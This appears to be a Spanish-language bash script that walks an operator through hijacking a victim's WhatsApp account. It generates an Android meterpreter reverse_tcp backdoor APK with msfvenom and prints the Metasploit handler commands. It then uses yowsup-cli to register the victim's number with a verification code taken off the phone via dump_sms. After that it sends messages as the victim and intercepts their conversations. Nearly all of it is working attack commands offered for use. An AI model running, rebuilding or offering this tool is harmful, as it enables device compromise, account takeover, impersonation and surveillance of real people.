#!/bin/bash

# Visita nuestra página: www.mundohackers.es

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

if [ "$(id -u)" = "0" ]; then
	sleep 2
	clear
	echo -e -n "$blueColour-> ¿Desea instalar FatRat para la creación del BackDoor?$endColour$redColour <Y/N>$endColour: "
	read respuesta
	echo " "

	if [ "$respuesta" = "Y" ]; then
		cd
		git clone https://github.com/Screetsec/TheFatRat
		echo -e "$blueColour\n-> Repositorio clonado correctamente...$endColour"
		echo -e "$blueColour\n-> Para instalar las herramientas necesarias aplicar:$endColour"
		echo -e "\nchmod +x setup.h && chmod +x fatrat && chmod +x powerfull.sh && ./setup.sh"
		read respuesta
	fi

	echo -e -n "$blueColour-> ¿Desea instalar la librería Yowsup?$endColour$redColour <Y/N>$endColour: "
	read respuesta
	echo " "

	if [ "$respuesta" = "Y" ]; then
		cd
		git clone https://github.com/tgalal/yowsup
		echo " "
	fi

	echo -e "$blueColour-> Cargando menú...$endColour"
	sleep 3

	while true
		do
			clear
			echo -e "$yellowColour ╭━╮╱╱╱╱╱╱╭╮╱╱╭┳━┳┳━━╮$endColour"
			sleep 0.4
			echo -e "$yellowColour ┃╋┣━┳━━┳━┫╰┳━┫┃┃┃┃╭╮┃$endColour"
			sleep 0.4
			echo -e "$yellowColour ┃╮┫┻┫┃┃┃╋┃╭┫┻┫┃┃┃┃┣┫┃$endColour"
			sleep 0.4
			echo -e "$yellowColour ╰┻┻━┻┻┻┻━┻━┻━┻━┻━┻╯╰╯$endColour"
			sleep 0.8
			echo -e "$blueColour ---------------------$endColour"
			echo -e "$yellowColour 1. Crear BackDoor$endColour"
			echo -e "$yellowColour 2. Obtener WhatsApp$endColour"
			echo -e "$yellowColour 3. Enviar Mensaje Desde WhatsApp Víctima$endColour"
			echo -e "$yellowColour 4. Esnifar Conversaciones WhatsApp$endColour"
			echo -e "$yellowColour 5. Eliminar 'whatsapp_config.txt' actual"
			echo -e "$redColour 0. Salir$endColour"
			echo -e "$blueColour ---------------------$endColour"
			echo -e -n "$redColour-> Selecciona una opción: $endColour"
			read respuesta

			if [ "$respuesta" = "1" ]; then
				echo -e -n "\n$yellowColour-> Host: $endColour"
				read ip
				echo -e -n "\n$yellowColour-> Puerto: $endColour"
				read puerto
				echo -e -n "\n$yellowColour-> Nombre del programa: $endColour"
				read nombre_programa
				echo " "

				sudo msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=$puerto R > ~/Escritorio/$nombre_programa.apk

				echo -e "$blueColourPrograma creado con éxito en el Escritorio$endColour"
				echo -e "$yellowColour\nAhora desde metasploit aplica los siguientes comandos:$endColour"
				echo -e "$grayColour\n- use exploit/multi/handler$endColour"
				echo -e "$grayColour- set payload android/meterpreter/reverse_tcp$endColour"
				echo -e "$grayColour- set lhost $ip$endColour"
				echo -e "$grayColour- set lport $puerto$endColour"
				echo -e "$grayColour- exploit$endColour"
				echo -e "$redColour\nPresiona <Enter> para continuar...$endColour"
				read

			elif [ "$respuesta" = "2" ]; then
				echo -e -n "\n$yellowColour-> Prefijo telefónico internacional (ej: 34):$endColour "
				read cc
				echo -e -n "\n-$yellowColour> Número de teléfono (ej: 682213452):$endColour "
				read phone
				echo -e -n "\n$yellowColour-> Selecciona la opción que se ajuste al número telefónico:$endColour\n"
				sleep 2
				echo " "
				echo -e "$redColour.1.$endColour$blueColour  Operator: Vodafone Spain | Brand: Vodafone$endColour"
				echo -e "$redColour.2.$endColour$blueColour  Operator: France Telecom España SA | Brand: Orange$endColour"
				echo -e "$redColour.3.$endColour$blueColour  Operator: Xfera Moviles SA | Brand: Yoigo$endColour"
				echo -e "$redColour.4.$endColour$blueColour  Operator: Telefónica Móviles España | Brand: Movistar$endColour"
				echo -e "$redColour.5.$endColour$blueColour  Operator: Vodafone Spain | Brand: Vodafone$endColour"
				echo -e "$redColour.6.$endColour$blueColour  Operator: -- | Brand: Euskatel$endColour"
				echo -e "$redColour.7.$endColour$blueColour  Operator: France Telecom España SA | Brand: Orange$endColour"
				echo -e "$redColour.8.$endColour$blueColour  Operator: -- | Brand: Operadora de Telecomunicaciones Opera SL$endColour"
				echo -e "$redColour.9.$endColour$blueColour  Operator: France Telecom España SA | Brand: Orange$endColour"
				echo -e "$redColour.10.$endColour$blueColour Operator: BT Group España Comapía de Servicios | Brand: BT$endColour"
				echo -e "$redColour.11.$endColour$blueColour Operator: Telecable de Asturias S.A.U. | Brand: TeleCable$endColour"
				echo -e "$redColour.12.$endColour$blueColour Operator: Móbil R | Brand: R Cable y Telecomunicaciones Galicia S.A. SL$endColour"
				echo -e "$redColour.13.$endColour$blueColour Operator: Cableuropa S.A.U. | Brand: ONO$endColour"
				echo -e "$redColour.14.$endColour$blueColour Operator: Orange S.A. | Brand: Jazztel$endColour"
				echo " "
				echo -e -n "$yellowColour>$endColour "
				read opcion

				if [ "$opcion" = "1" ]; then
					mcc=214
					mnc=01
				elif [ "$opcion" = "2" ]; then
					mcc=214
					mnc=03
				elif [ "$opcion" = "3" ]; then
					mcc=214
					mnc=04
				elif [ "$opcion" = "4" ]; then
					mcc=214
					mnc=05
				elif [ "$opcion" = "5" ]; then
					mcc=214
					mnc=06
				elif [ "$opcion" = "6" ]; then
					mcc=214
					mnc=08
				elif [ "$opcion" = "7" ]; then
					mcc=214
					mnc=09
				elif [ "$opcion" = "8" ]; then
					mcc=214
					mnc=10
				elif [ "$opcion" = "9" ]; then
					mcc=214
					mnc=11
				elif [ "$opcion" = "10" ]; then
					mcc=214
					mnc=15
				elif [ "$opcion" = "11" ]; then
					mcc=214
					mnc=16
				elif [ "$opcion" = "12" ]; then
					mcc=214
					mnc=17
				elif [ "$opcion" = "13" ]; then
					mcc=214
					mnc=18
				elif [ "$opcion" = "14" ]; then
					mcc=214
					mnc=21
				fi

				echo -e "$yellowColour\n-> Registrados valores cc=$cc | mcc=$mcc | mnc=$mnc | phone=$phone$endColour"
				sleep 3
				echo -e "$yellowColour\n-> Mandando código de registro WhatsApp...$endColour"
				echo " "
				sleep 3

				sudo yowsup-cli registration --requestcode sms --phone $cc$phone --cc $cc --mcc $mcc --mnc $mnc

				echo -e -n "\n$yellowColour-> Desde metasploit aplica el comando dump_sms una vez ganada la sesión | Código (ej: 465-798):$endColour "
				read codigo_registro
				echo " "
				echo -e "$yellowColour-> Realizando registro...$endColour\n"
				sleep 2

				sudo yowsup-cli registration --register $codigo_registro --phone $cc$phone --cc $cc

				echo -e -n "\n$yellowColour-> Introduce la pw generada:$endColour "
				read password

				echo -e -n "\n$yellowColour-> Detalles de la sesión WhatsApp:$endColour\n"
				echo " "
				echo -e "$blueColour-------------------------------------$endColour"
				echo -e "$yellowColour cc=$cc$endColour"
				echo -e "$yellowColour phone=$phone"
				echo -e "$yellowColour password=$password"
				echo -e "$blueColour-------------------------------------$endColour"
				echo "cc=$cc" >> whatsapp_config.txt
				echo "phone=$cc$phone" >> whatsapp_config.txt
				echo "password=$password" >> whatsapp_config.txt
				echo -e "$blueColour\nSe ha generado el fichero 'whatsapp_config.txt en el directorio actual$endColour"
				echo -e "$redColour\nPresiona <Enter> para continuar...$endColour"
				read

			elif [ "$respuesta" = "3" ]; then
				echo -e -n "\n$yellowColour-> Prefijo internacional (A quien queremos mandar el mensaje):$endColour "
				read prefijo_envio
				echo -e -n "\n$yellowColour-> Número de teléfono (A quien queremos mandar el mensaje):$endColour "
				read numero_envio
				echo -e -n "\n$yellowColour-> Mensaje a enviar:$endColour "
				read -e mensaje
				echo " "

				sudo yowsup-cli demos --config whatsapp_config.txt --send $prefijo_envio$numero_envio "$mensaje"

				echo -e "$redColour\nPresiona <Enter> para continuar...$endColour"
				read	

			elif [ "$respuesta" = "4" ]; then
				echo -e "\n$blueColour-> Esnifando conversaciones...$endColour\n"

				sudo yowsup-cli demos --config whatsapp_config.txt --echo

			elif [ "$respuesta" = "5" ]; then
				sudo rm -r whatsapp_config.txt

			elif [ "$respuesta" = "0" ]; then
				echo " "
				break
			fi
	done

else
	echo -e "\n$redColour-> Debes de entrar como superusuario$endColour\n"
fi
